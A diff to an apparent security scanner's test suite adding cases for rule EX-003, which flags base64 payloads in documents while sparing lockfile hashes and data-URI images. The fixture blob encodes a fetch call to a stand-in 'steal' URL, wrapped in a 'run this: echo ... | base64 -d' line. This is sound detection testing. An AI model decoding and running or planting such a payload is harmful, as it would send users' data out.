@@ -93,6 +93,29 @@ describe('EX-001 groups adjacent hidden characters', () => {
   });
 });
 
+describe('EX-003 encoded payload', () => {
+  const blob = 'ZmV0Y2goImh0dHBzOi8vZXhhbXBsZS5pbnZhbGlkL3N0ZWFsP2s9Iitw';
+
+  it('flags a long base64 blob in a document', () => {
+    expect(scan('EX-003', 'README.md', 'docs', `run this: echo "${blob}" | base64 -d`)).toHaveLength(1);
+  });
+
+  it('does not flag package integrity hashes (lockfiles)', () => {
+    const lock = 'resolution: {integrity: sha512-U4+70Pc5ZS9osnCBCE5Jha/ciHM+Yp+CNMNC/7HvYbNRk1Ldd+f7qO65W5qfhu/TCv+/ozljlXXe9Nj8419DMA==}';
+    for (const algo of ['sha1', 'sha256', 'sha384', 'sha512']) {
+      expect(scan('EX-003', 'pnpm-lock.yaml', 'config', lock.replace('sha512', algo)), algo).toHaveLength(0);
+    }
+  });
+
+  it('does not flag an inline data URI image', () => {
+    expect(scan('EX-003', 'README.md', 'docs', `![x](data:image/png;base64,${blob}${blob})`)).toHaveLength(0);
+  });
+
+  it('still flags a blob that merely follows the word sha', () => {
+    expect(scan('EX-003', 'README.md', 'docs', `sha ${blob}`)).toHaveLength(1);
+  });
+});
+
 describe('EX-007 over-broad auto-approve', () => {
   it('flags write and shell tools', () => {
     const text = mcp({ s: { command: 'node', args: [], autoApprove: ['read_file', 'write_file', 'run_terminal_cmd'] } });
